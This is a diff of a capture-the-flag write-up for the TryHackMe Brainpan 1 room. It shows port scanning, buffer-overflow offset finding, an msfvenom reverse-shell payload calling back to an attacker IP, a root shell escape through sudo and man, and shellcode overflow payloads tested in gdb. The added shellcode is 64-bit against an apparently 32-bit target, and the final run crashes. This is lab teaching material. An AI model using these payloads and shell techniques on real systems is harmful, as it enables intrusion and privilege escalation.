@@ -2,7 +2,11 @@
 title: "Brainpan 1"
 ---
 
+:::info
+
 This is a write-up for the [Brainpan 1 Room](https://tryhackme.com/room/brainpan) on TryHackMe. S/o to SnoOw, Hunterbot, Tedd and Kafka's help on this box!
+
+:::
 
 ## RECON
 
@@ -14,7 +18,7 @@ Otherwise known as "Port Scanning"
 
 Using dievus' [threader3000](https://github.com/dievus/threader3000) multi-threaded python port scanner with Nmap integration to scan the brainpan box:
 
-```sh
+```bash
 ------------------------------------------------------------   [31/31]
         Threader 3000 - Multi-threaded Port Scanner                                                                 
                        Version 1.0.7                                                                                
@@ -99,7 +103,7 @@ Press enter to quit...
 
 We can see the following open ports:
 
-```sh
+```bash
 PORT      STATE SERVICE VERSION
 9999/tcp  open  abyss?
 | fingerprint-strings: 
@@ -117,7 +121,7 @@ PORT      STATE SERVICE VERSION
 
 Looks like a web server running on port `10000`, I used `gobuster` and found:
 
-```sh
+```bash
 http://10.10.5.188:10000/bin                  (Status: 301) [Size: 0] [--> /bin/]
 http://10.10.5.188:10000/index.html           (Status: 200) [Size: 215]
 
@@ -141,7 +145,7 @@ Using Noodles offset short cut method, I quickly find the buffer offset for my p
 
 Create an offset pattern for my script:
 
-```sh
+```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700
 ```
 
@@ -183,7 +187,7 @@ When Immunity Debugger crashes, read the value from `EIP` register e.g. `3572413
 
 Use metasploit `pattern_offset` to find this pattern in the string from before:
 
-```sh
+```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 35724134
  [*] Exact match at offset 524
 ```
@@ -285,7 +289,7 @@ Run this mona command in Immunity Debugger to find a `jmp` address to use: `!mon
 
 Looks like we only have 1 x address to choose from:
 
-```sh
+```bash
 Log data, item 3
  Address=311712F3
  Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\brainpan.exe)
@@ -309,7 +313,7 @@ Thanks to tedd from the stream for figuring out the linux reverse shell to use w
 
 Let's create the following linux reverse shell:
 
-```sh
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\x00" -f c -e x86/shikata_ga_nai
 ```
 
@@ -358,7 +362,7 @@ Send payload `./thm-linux.py`
 
 Success:
 
-```sh
+```bash
 └─$ sudo rlwrap nc -lnvp 80                                                                                     1 ⨯
 listening on [any] 80 ...
 connect to [10.11.55.83] from (UNKNOWN) [10.10.73.41] 42786
@@ -381,7 +385,7 @@ There are (supposedly) two routes to root: sudo, and a suid binary on the box. L
 
 Once we have our upgraded shell, we try out `sudo -l` to see what we can see:
 
-```sh
+```bash
 sudo -l
 sudo -l
 Matching Defaults entries for puck on this host:
@@ -397,7 +401,7 @@ So we have a command we can run as root, with no password required.
 
 When I run that command `sudo /home/anansi/bin/anansi_util`, I get this:
 
-```sh
+```bash
 sudo /home/anansi/bin/anansi_util
 sudo /home/anansi/bin/anansi_util
 Usage: /home/anansi/bin/anansi_util [action]
@@ -412,7 +416,7 @@ The `manual [command]` looks the most interesting because we get to feed it inpu
 
 Long story short, it runs the `man` command and gives us a manual page based on a keyword we give it. Myself, along with the collective skills of my Twitch chat crew, we deduce that we will try and pop a shell from inside the `less` output that `man` gives i.e. we try and enter `!/bin/bash` from inside the `man` output (which is running as `sudo`) and essentially will be `root` running the shell command.
 
-```sh
+```bash
 sudo /home/anansi/bin/anansi_util manual id
 sudo /home/anansi/bin/anansi_util manual id
 No manual entry for manual
@@ -438,7 +442,7 @@ I copied the binary to shared web folder `/bin/cp validate /home/puck/web/bin` s
 
 When I run it, it does the following:
 
-```sh
+```bash
 └─$ ./validate     
 usage ./validate <input>
 
@@ -446,13 +450,32 @@ usage ./validate <input>
 validating input...passed.
 ```
 
-Looks like a buffer overflow situation.
+Looks like a possible buffer overflow situation.
+
+Also, when I run strings on the binary, a few key words stand out:
+
+```bash
+strings validate                                                                                                
+/lib/ld-linux.so.2                                                                                                  
+__gmon_start__                                                                                                      
+libc.so.6                                                                                                           
+_IO_stdin_used                                                                                                      
+strcpy # <-- we know this is vulnerable to overflow
+validate                                                                                                            
+main                                                                                                                
+validate.c                                                                                                          
+long long int                                                                                                       
+unsigned char                                                                                                       
+main                                                                                                                
+/root/bin/brainpan # <-- running a binary as root?                                                                 
+long long unsigned int
+```
 
 I will use gdb on my local machine to develop the overflow payload.
 
 Open the binary up in gdb:
 
-```sh
+```bash
 $ gdb ./validate
 GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
 Copyright (C) 2021 Free Software Foundation, Inc.
@@ -475,7 +498,7 @@ Reading symbols from ./validate...
 
 Let's find the offset, create the pattern first:
 
-```sh
+```bash
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
 └─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120             
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
@@ -483,7 +506,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 Feed this as input to our `./validate` program in gdb:
 
-```sh
+```bash
 (gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'")
 Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'")
 
@@ -493,8 +516,92 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Query the return address in our `pattern_offset`, to find the offset:
 
-```sh
+```bash
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
 └─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 120 -q 39644138
 [*] Exact match at offset 116
+```
+
+We now have our payload length:
+
+`payload = NOP + shellcode + alignment = 116 bytes` leaving 4 bytes for return address = `120 bytes`
+
+```bash
+$ pwn shellcraft -f d amd64.linux.sh
+\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
+```
+
+check size using python:
+
+```bash
+$ python3
+Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> shellcode = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
+>>> len(shellcode)
+48
+```
+
+### Shellcode math
+
+`payload = NOP + 48 + alignment = 116`
+
+:::info
+
+The `alignment` block is usually 12-bytes long (need to confirm where this came from)
+
+:::
+
+So, `payload = NOP + 48 + 12 = 116`, so `NOP` is `56` bytes long.
+
+```bash
+run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4)"
+```
+
+Run payload in GDB:
+
+```bash
+(gdb) run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4")
+Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+```
+
+This looks good, we're controlling the EIP (4 x C's).
+
+View memory, look for where the NOPs are:
+
+```bash
+(gdb) x/100x $sp
+0xffffd550:     0x504e4941      0x2f314e41      0x696c6176      0x65746164
+0xffffd560:     0x90909000      0x90909090      0x90909090      0x90909090 # <-- NOPs
+0xffffd570:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd580:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd590:     0x90909090      0x90909090      0x48686a90      0x69622fb8
+0xffffd5a0:     0x2f2f2f6e      0x89485073      0x697268e7      0x34810101
+0xffffd5b0:     0x01010124      0x56f63101      0x485e086a      0x4856e601
+0xffffd5c0:     0xd231e689      0x0f583b6a      0x42424205      0x42424242 # <-- B*12
+0xffffd5d0:     0x42424242      0x43434342      0x414c0043      0x653d474e # <-- C*4
+```
+
+We pick an address where our NOPs are, I choose `0xffffd570`, in little endian format `\x70\xd5\xff\xff`.
+
+New payload with return address:
+
+```bash
+run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
+```
+
+Run it:
+
+```bash
+(gdb) run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd601 in ?? ()
 ```
